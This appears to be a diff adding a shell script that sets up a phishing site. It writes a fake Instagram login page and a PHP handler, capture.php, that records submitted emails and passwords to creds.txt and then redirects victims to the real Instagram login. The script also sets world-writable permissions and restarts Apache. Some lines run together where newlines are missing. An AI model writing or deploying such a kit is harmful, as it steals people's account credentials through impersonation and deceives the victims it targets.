@@ -1,0 +1,12 @@
+cd /var/www/htmlcat > index.html << 'EOF'
+<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><title>Instagram</title><style>body{font-family:-apple-system;background:#fafafa;margin:0;padding:0}.login{max-width:350px;margin:40px auto;background:#fff;border:1px solid #dbdbdb;padding:40px 40px 20px}input{width:100%;padding:9px 0;border:1px solid #efefef;border-radius:3px;background:#fafafa;font-size:14px;text-align:center;margin:8px 0;box-sizing:border-box}.btn{background:#0095f6;color:#fff;border:none;border-radius:5px;font-weight:600;padding:7px 0;width:100%;margin:8px 0;cursor:pointer}.logo{width:175px;margin:0 auto 30px;display:block}</style></head><body><div class="login"><img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" class="logo"><form action="capture.php" method="POST"><input type="email" name="email" placeholder="Email or phone number" required><input type="password" name="password" placeholder="Password" required><button type="submit" class="btn">Log in</button></form></div></body></html>
+EOFcat > capture.php << 'EOF'
+<?php
+if($_POST['email']&&$_POST['password']){
+    $data=date('Y-m-d H:i:s')." | Email: ".$_POST['email']." | Pass: ".$_POST['password']."\n";
+    file_put_contents('creds.txt',$data,FILE_APPEND);
+    header('Location: https://www.instagram.com/accounts/login/');
+    exit;
+}
+?>
+EOFchmod 777 * && sudo systemctl restart apache2
